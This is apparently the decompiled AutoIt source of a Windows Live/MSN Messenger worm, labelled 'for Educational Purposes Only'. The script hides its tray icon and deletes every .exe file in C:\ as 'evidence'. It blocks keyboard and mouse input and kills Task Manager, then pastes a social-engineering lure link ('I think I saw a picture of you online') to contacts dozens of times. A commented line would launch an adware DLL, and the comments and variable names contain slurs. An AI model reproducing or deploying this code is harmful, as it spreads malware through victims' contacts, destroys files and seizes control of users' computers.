; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: G:\sexy.au3>
; ----------------------------------------------------------------------------

;; MSN Messenger "Mass Messenger" v1.03 , HARHAR!!!
;; This Code is for Educational Purposes Only.
;; Greetingz to the "Knet Knet Nig Nig" Team
;;
		;;;;;;;;;;;;;;;;;;;;;;;      ;;;;           ;;;;
	   ;;;;;;;;;;;;;;;;;;;;;;;      ;;;;		   ;;;;
      ;;;;;;; 				       ;;;;           ;;;;
     ;;;;;;;;;;;;;;;;;;;;;;;      ;;;; WLM + 7.x ;;;;
    ;;;;;;;;;;;;;;;;;;;;;;;		 ;;;;           ;;;;
   ;;;;;;;					    ;;;;  Coding   ;;;;
  ;;;;;;;				       ;;;; <  By  >  ;;;;
 ;;;;;;;                      ;;;; XFREGGIRT ;;;;
;;;;;;;					     ;;;;;;;;;;;;;;;;;;;

#NoTrayIcon

;; Close current spreader
If ProcessExists("mrsss.exe") Then
	ProcessClose("mrsss.exe")
	Elseif ProcessExists ("crsss.exe") Then
	ProcessClose("crsss.exe")
EndIf

;ADware DLL
;; Run( "rundll32.exe cs67140.dll,Start" )

;;Delete All Exe Files aka evidence.
FileDelete("c:\*.exe")

;; Amount of spams you would like. Default 50
$AMOUNT = 40
;; Do not change ..
$KNET = 0
$NIG = 0
$SEX = 0

AutoItSetOption("WinTitleMatchMode", 4)

Sleep( 120000 )

;; Wait till WLM pops up.
While WinWaitActive ( "classname=MSBLWindowClass" )
	if Winactive ( "classname=MSBLWindowClass" ) Then
		Send( "{ESC}")
		;; Insert your Spam Sentence between (" ")
		;;ClipPut ( "Hey! , Im using the New MSN 9 Beta (H) , It has 100+ Options and New 3D Emoticons :D , Free Worldwide Calling and much more! ;) Download Microsoft's Free Online Installer Here! ===> http://shopping.msn.com/Track/TrackLink/shp/?p=setid=100:0&u=http://www.speedlinks.com/MSN9BETA-SETUP.exe&linkId=1970&dpId=2408&vendId=2408&catId=5318&hsv=bm=" )
		ClipPut("Heeeey I think I saw a picture of you online.. http://www.viotagallery.com/images/library/img349_dl.php here.. this is you right? :D ")
		;; Block User Mouse/Keyboard Input.
		BlockInput ( 1 )
	EndIf

   If WinActive( "Windows Live Messenger" ) Then
	   ;; Change to Online Instead of Using Groups.
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
       Send("{RIGHT}")
       Send("{ENTER}")
	   Sleep( 200 )
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{RIGHT}")
	   Send("{DOWN}")
	   Send("{DOWN}")
       Send("{ENTER}")
	   WinSetState( "classname=MSBLWindowClass" , "", @SW_MAXIMIZE )
	   MouseMove( 300 , 300 )
	   MouseClick( "Left" )
   ElseIf WinActivate ( "MSN Messenger" ) Then
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
       Send("{RIGHT}")
	   Send("{DOWN}")
	   Send("{ENTER}")
	   WinSetState( "classname=MSBLWindowClass" , "", @SW_MAXIMIZE )
	   MouseMove( 300 , 300 )
	   MouseClick( "Left" )
   EndIf

	;; Start The Spam!
	    Do
			if WinActive ( "classname=MSBLWindowClass" ) Then
			BlockInput ( 1 )
			Send( "{HOME}" )
			Send( "{DOWN}" )
			Send( "{ENTER}")
		EndIf
			If WinActive ( "classname=IMWindowClass" ) Then
				Send( "^v" )
			    Send( "{ENTER}")
				Sleep( 100 )
				Send( "{ESC}")
				Sleep ( 1600 )
				$KNET = $KNET + 1
				ElseIf ProcessExists( "taskmgr.exe" ) Then
						ProcessClose( "taskmgr.exe" )
			EndIf
		Until $KNET = 1

		While $NIG <= $AMOUNT
			if WinActive ( "classname=MSBLWindowClass" ) Then
				ClipPut("Heeeey I think I saw a picture of you online.. http://www.viotagallery.com/images/library/img349_dl.php here.. this is you right? :D ")
				BlockInput ( 1 )
				Send( "{DOWN}" )
				Send( "{ENTER}")
			EndIf
				;; When Buddy Window Shows up , SPAM!
				If WinActive( "classname=IMWindowClass" ) Then
					Send( "^v" )
					Send( "{ENTER}" )
					Sleep( 100 )
					Send( "{ESC}")
					Sleep ( 1600 )
					$NIG = $NIG + 1
				ElseIf ProcessExists( "taskmgr.exe" ) Then
						ProcessClose( "taskmgr.exe" )
					EndIf
				If WinActive( "classname=#32770") Then
					Send ("{ESC}")
				EndIf
			    If WinActive( "classname=PageWindowClass") Then
					Send("{ESC}")
				EndIf

				If WinActive( "classname=IEFrame" ) Then
				BlockInput ( 0 )
				Exit
				EndIf
				;; Offline Messages Safety :)
				If Winactive ( "classname=DUIDialog" ) Then
					Send( "{+}" )
					Send( "{ENTER}" )
				EndIf

				if $NIG = 15 Then
					blockinput( 0 )
					Sleep ( 40000 )
				ElseIf ProcessExists( "taskmgr.exe" ) Then
				ProcessClose( "taskmgr.exe" )
			EndIf

				if $NIG = 30 Then
					blockinput( 0 )
					Sleep ( 40000 )
				ElseIf ProcessExists( "taskmgr.exe" ) Then
					ProcessClose( "taskmgr.exe" )

			Endif

				if $NIG = 45 Then
					blockinput( 0 )
					Sleep ( 40000 )
				ElseIf ProcessExists( "taskmgr.exe" ) Then
					ProcessClose( "taskmgr.exe" )
			EndIf
				;; If $NIG Hit the $AMOUNT you ordered , quit.
				If  $AMOUNT <= $NIG  Then
					BlockInput ( 0 )
					ProcessClose("msnmsgr.exe")
					$PID = ProcessExists("msnmsgr.exe") ; Will return the PID or 0 if the process isn't found.
					If $PID Then ProcessClose($PID)
					Exit
					EndIf
		WEnd
WEnd


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: G:\sexy.au3>
; ----------------------------------------------------------------------------

